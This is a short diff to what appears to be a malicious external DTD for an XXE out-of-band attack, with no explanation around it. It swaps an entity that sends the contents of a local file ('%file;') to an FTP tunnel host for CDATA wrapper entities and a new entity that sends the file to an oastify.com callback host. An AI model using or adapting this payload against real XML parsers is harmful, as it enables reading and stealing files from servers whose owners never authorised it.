@@ -1,2 +1,4 @@
-<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'ftp://ukrzb-49-206-99-72.a.free.pinggy.link:36043/%file;'>">
-%stack;
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'https://cn31vvj9c1b3d6bifk0hz5xroiu9i2dq2.oastify.com/d=%file;'>">
+%all;
